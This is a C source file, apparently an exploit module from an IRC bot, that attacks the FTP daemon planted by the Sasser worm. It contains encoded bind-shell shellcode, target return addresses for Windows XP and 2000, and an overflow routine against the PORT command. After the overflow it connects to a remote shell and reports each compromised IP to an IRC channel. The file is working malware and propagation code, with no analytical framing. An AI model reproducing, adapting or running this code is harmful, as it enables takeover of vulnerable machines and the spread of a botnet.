#include "includes.h"
#include "functions.h"
#include "externs.h"
/*
  _________ / ___// ____/ ____/
 / ___/ __ \\__ \/ __/ / /
/ /  / /_/ /__/ / /___/ /___
/_/   \____/____/_____/\____/

- ROMANIAN SECURITY RESEARCH 2004 -


sasser v[a-e] exploit (of its ftpd server)

exploit version 1.4, public

author:  mandragore
date:  Mon May 10 16:13:31     2004
vuln type: SEH ptr overwriting
greets:  rosecurity team
discovery: edcba
note:  sasser.e has its ftpd on port 1023
update:  offsets

*/

struct { long goreg; long gpa; long lla; } targets[] = {
	{ 0x77BEEB23, 0x77be10CC, 0x77be10D0 }, //wXP SP1 many
	{ 0x77C1C0BD, 0x77C110CC, 0x77c110D0 }, //wXP SP1 most others
	{ 0x7801D081, 0x780320cc, 0x780320d0 }, //w2k SP4 many
};

unsigned char bs[]={
0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xDD,0x80,0x36,0xDE,0x46,0xE2,0xFA,
0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0xB9,0x51,0xD8,0xDE,0xDE,0x60,0xDE,0xFE,0x9E,
0xDE,0xB6,0xED,0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,
0x9E,0xDE,0x49,0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0x36,0xD5,0xDE,0xDE,
0xDE,0x89,0x8D,0x9F,0x8D,0xB1,0xBD,0xB5,0xBB,0xAA,0x9F,0xDE,0x89,0x21,0xC8,0x21,
0x0E,0x4D,0xB4,0xDE,0xB6,0xDC,0xDE,0xCA,0x6A,0x55,0x1A,0xB4,0xCE,0x8E,0x8D,0x36,
0xDB,0xDE,0xDE,0xDE,0xBC,0xB7,0xB0,0xBA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0xB4,0xDF,
0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xB2,0xB7,0xAD,0xAA,0xBB,0xB0,0xDE,0x89,0x21,0xC8,
0x21,0x0E,0xB4,0xDE,0x8A,0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xBF,0xBD,0xBD,0xBB,0xAE,
0xAA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0x55,0x06,0xED,0x1E,0xB4,0xCE,0x87,0x55,0x22,
0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,0xDF,0x8E,0x8E,
0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,0xBA,0xDE,0x8E,0x36,0xD1,0xDE,0xDE,0xDE,0x9D,
0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,0xDE,0x18,0xD9,
0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,0xDE,0x5D,0x19,0xE6,0x4D,0x75,0x75,0x75,0xBA,
0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,0x55,0x9E,0xC2,0x55,0xDE,0x21,0xAE,0xD6,0x21,
0xC8,0x21,0x0E
};

/*char bs[] =
   "\xEB\x0F\x8B\x34\x24\x33\xC9\x80\xC1\xDD\x80\x36\xDE\x46\xE2\xFA"
   "\xC3\xE8\xEC\xFF\xFF\xFF\xBA\xB9\x51\xD8\xDE\xDE\x60\xDE\xFE\x9E"
   "\xDE\xB6\xED\xEC\xDE\xDE\xB6\xA9\xAD\xEC\x81\x8A\x21\xCB\xDA\xFE"
   "\x9E\xDE\x49\x47\x8C\x8C\x8C\x8C\x9C\x8C\x9C\x8C\x36\xD5\xDE\xDE"
   "\xDE\x89\x8D\x9F\x8D\xB1\xBD\xB5\xBB\xAA\x9F\xDE\x89\x21\xC8\x21"
   "\x0E\x4D\xB4\xDE\xB6\xDC\xDE\xCA\x6A\x55\x1A\xB4\xCE\x8E\x8D\x36"
   "\xDB\xDE\xDE\xDE\xBC\xB7\xB0\xBA\xDE\x89\x21\xC8\x21\x0E\xB4\xDF"
   "\x8D\x36\xD9\xDE\xDE\xDE\xB2\xB7\xAD\xAA\xBB\xB0\xDE\x89\x21\xC8"
   "\x21\x0E\xB4\xDE\x8A\x8D\x36\xD9\xDE\xDE\xDE\xBF\xBD\xBD\xBB\xAE"
   "\xAA\xDE\x89\x21\xC8\x21\x0E\x55\x06\xED\x1E\xB4\xCE\x87\x55\x22"
   "\x89\xDD\x27\x89\x2D\x75\x55\xE2\xFA\x8E\x8E\x8E\xB4\xDF\x8E\x8E"
   "\x36\xDA\xDE\xDE\xDE\xBD\xB3\xBA\xDE\x8E\x36\xD1\xDE\xDE\xDE\x9D"
   "\xAC\xBB\xBF\xAA\xBB\x8E\xAC\xB1\xBD\xBB\xAD\xAD\x9F\xDE\x18\xD9"
   "\x9A\x19\x99\xF2\xDF\xDF\xDE\xDE\x5D\x19\xE6\x4D\x75\x75\x75\xBA"
   "\xB9\x7F\xEE\xDE\x55\x9E\xD2\x55\x9E\xC2\x55\xDE\x21\xAE\xD6\x21"
   "\xC8\x21\x0E";*/

BOOL SASSER(EXINFO exinfo)
{
	//char buff[4096];
	char *buff=(char *)malloc(4096);
	char buffer[IRCLINE];
	char *jmp[]={"\xeb\x06","\xe9\x13\xfc\xff\xff"};
	BOOL bRet = FALSE;

	SOCKET sSock;
	if((sSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) return bRet;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
	ssin.sin_port = fhtons((unsigned short)exinfo.port);

	int port=5301;
	int Port=port;
	Port=Port ^ 0xdede;
	Port=(Port & 0xff) << 8 | Port >>8;
	memcpy(bs+0x57,&Port,2);

	int tType, targetOS = FpHost(exinfo.ip, FP_LSASS);
	if (targetOS == OS_WINXP || targetOS == OS_UNKNOWN || targetOS == OS_WINNT) tType = 1;
	else if (targetOS == OS_WIN2K) tType = 2;

	// --------------------  core

	if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) return bRet;

	memset(buff, '\0', 4096);
	
	sprintf(buff,"USER x\n");
	fsend(sSock,buff,strlen(buff),0);
	frecv(sSock,buff,4095,0);
	
	sprintf(buff,"PASS x\n\r");
	fsend(sSock,buff,strlen(buff),0);
	frecv(sSock,buff,4095,0);
	
	memset(buff+0000,0x90,2000);
	strncpy(buff,"PORT ",5);
	strcat(buff,"\x0a");
	memcpy(buff+272,jmp[0],2);
	memcpy(buff+276,&targets[tType].goreg,4);
	memcpy(buff+280,jmp[1],5);
	
	int gpa=targets[tType].gpa^0xdededede,
		lla=targets[tType].lla^0xdededede;
	memcpy(bs+0x1d,&gpa,4);
	memcpy(bs+0x2e,&lla,4);
	
	memcpy(buff+300, &bs, 243);
	fsend(sSock,buff,strlen(buff),0);
	
	free(buff);
	fclosesocket(sSock);

	// Connect to Shell
	if (ConnectShell(exinfo, 5301) == TRUE) bRet = TRUE;
	
	//fWSACleanup();
	// --------------------  end of core
	
	if (bRet == TRUE) {
		_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
		if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
		addlog(buffer);
		exploit[exinfo.exploit].stats++;
	}
	
	return bRet;
}
